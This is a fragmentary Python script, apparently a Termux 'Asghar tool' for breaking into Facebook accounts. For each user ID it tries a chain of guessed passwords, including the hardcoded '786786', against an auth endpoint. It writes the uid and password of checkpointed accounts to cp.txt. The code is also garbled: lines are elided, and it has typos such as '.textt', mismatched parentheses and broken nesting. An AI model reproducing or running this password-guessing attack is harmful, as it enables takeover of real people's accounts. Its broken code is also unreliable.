...
if not os.path.isfile("/data/data/com.termux/files/home/asg/...../node_modules/bytes/index.js"):
    ...
    print("")
    print("")
    print("\t\033[1;97mFollow me on Facebook to continue")
    print("")
    print("")
    print("")
    print("")
...
def tech_abm():
    ...
    print("")
    print("")
    os.system('echo -e "\t Asghar tool has been update      "| lolcat')
    print("")
    print("")
    print("")
    print("")
    ...
    print("")
    print("")
    os.system('echo -e "\t Welcome to new Asghar tool       "| lolcat')
    print("")
    print("")
    print("")
    print("")
	...
	def main(arg):
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		        print("\x1b[1;97m[\x1b[1;91mCheck-Point\x1b[1;97m]\x1b[1;93m "+uid+"\x1b[1;97m | \x1b[1;93m"+pass1+"\x1b[1;97m | \x1b[1;93m"+name)
		        cp=open("cp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid)
		    	...
		    	if "access_token" in d:
		            ...
		            q=json.loads(data)
		            if 'www.facebook.com' in d['error_msg']:
		                print("\x1b[1;91m[\x1b[1;93mCheck-Point\x1b[1;97m]\x1b[1;93m "+uid+"\x1b[1;97m | \x1b[1;93m"+pass2+"\x1b[1;97m | \x1b[1;93m"+name)
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		                ...
		                if 'access_token' in d:
		                    ...
		                    q=json.loads(data)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("\x1b[1;97m[\x1b[1;91mCheck-Point\x1b[1;97m]\x1b[1;93m "+uid+"\x1b[1;97m | \x1b[1;93m"+pass3+"\x1b[1;97m | \x1b[1;93m"+name)
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                        ...
		                        if 'access_token' in d:
		                            ...
		                            q=json.load (data)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("\x1b[1;97m[\x1b[1;91mCheck-Point\x1b[1;97m]\x1b[1;93m "+uid+"\x1b[1;97m | \x1b[1;93m"+pass4+"\x1b[1;97m | \x1b[1;93m"+name)
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                                ...
		                                if 'access_token' in d:
		                                    ...
		                                    pass5="786786"
		                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).textt
		                                    q=json.loads(data)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("\x1b[1;97m[\x1b[1;91mCheck-Point\x1b[1;97m]\x1b[1;93m "+uid+"\x1b[1;97m | \x1b[1;93m"+pass5+"\x1b[1;97m | \x1b[1;93m"+name)
		                                        cp=open("cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                        ...
		                                        if 'access_token' in d:
		                                           ...
		                                           data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header.text
		                                            q=json.loads(data)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                print("\x1b[1;97m[\x1b[1;91mCheck-Point\x1b[1;97m]\x1b[1;93m "+uid+"\x1b[1;97m | \x1b[1;93m"+pass6+"\x1b[1;97m | \x1b[1;93m"+name)
		                                                cp=open("cp.txt","a")
		                                                cp.write(uid+" | "+pass6+"\n")
		                                                cp.close()
		                                                cps.append(uid)
		                                          ...
		                                          data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
		                                                    q=json.loads(data)
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        print("\x1b[1;97m[\x1b[1;91mCheck-Point\x1b[1;97m]\x1b[1;93m "+uid+"\x1b[1;97m | \x1b[1;93m"+pass7+"\x1b[1;97m | \x1b[1;93m"+name)
		                                                        cp=open("cp.txt","a")
		                                                        cp.write(uid+" | "+pass7+"\n")
		                                                        cp.close()
		                                                        cps.append(uid)
